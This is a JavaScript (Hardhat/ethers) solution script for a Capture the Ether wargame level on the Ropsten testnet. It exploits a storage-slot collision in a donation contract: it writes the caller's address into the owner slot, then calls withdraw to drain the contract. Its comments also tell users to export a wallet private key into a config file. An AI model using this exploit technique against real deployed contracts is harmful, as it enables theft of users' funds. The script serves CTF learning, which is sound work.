const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

async function main() {
    //The contract abi
    const abi = [
        {"constant": false, "inputs": [], "name": "withdraw", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function"},
        {"constant": true, "inputs": [], "name": "owner", "outputs": [{"name": "", "type": "address"}], "payable": false, "stateMutability": "view", "type": "function"},
        {"constant": true, "inputs": [], "name": "isComplete", "outputs": [{"name": "", "type": "bool"}], "payable": false, "stateMutability": "view", "type": "function"},
        {"constant": false, "inputs": [{"name": "etherAmount", "type": "uint256"}], "name": "donate", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function"},
        {"constant": true, "inputs": [{"name": "", "type": "uint256"}], "name": "donations", "outputs": [{"name": "timestamp", "type": "uint256"}, {"name": "etherAmount", "type": "uint256"}], "payable": false, "stateMutability": "view", "type": "function" },
        {"inputs": [], "payable": true, "stateMutability": "payable", "type": "constructor"}
    ];
    
    //The contract address - Just copy it from the CTE challenge page
    const contractAddress = "0xC5De55653BB5d9E9dABF259e123Cefc828c6a076";
    
    /* 
    * To solve the challenge, you need to use your ropsten account, as CTE is expecting that account address.
    * To that effect, you need to export your private key from metamask and place it in the hardhat.config.js - the template is already there.
    * Then, we can get your wallet as the signer. The console.log should print your ropsten account address.
    */
    const [signer] = await ethers.getSigners();
    console.log("SIGNER: ", signer.address)

    //Get the contract and connect using your account
    var cteContract = new ethers.Contract(contractAddress, abi, signer);
    
    //Compute the uint256 value of our address
    let addressAsUint256 = BigNumber.from(signer.address);
    console.log("YOUR ADDRESS AS AN UINT256: ", addressAsUint256);
    
    //Compute the msg.value to send along
    let msgValue = addressAsUint256.div(BigNumber.from(10).pow(36)); 
    console.log("MSG VALUE TO SEND ALONG: ", msgValue);
    
    //Make the donation
    let donateTx = await cteContract.donate(addressAsUint256, { value: msgValue });
    let donateTxReceipt = await donateTx.wait();
    console.log("DONATION DONE: ", donateTxReceipt);

    //Withdraw the eth
    let withdrawTx = await cteContract.withdraw();
    let withdrawTxReceipt = await withdrawTx.wait();
    console.log("CONTRACT DRAINED: ", withdrawTxReceipt);
}

main()
.then(() => process.exit(0))
.catch((error) => {
    console.log(error);
    process.exit(1);
});

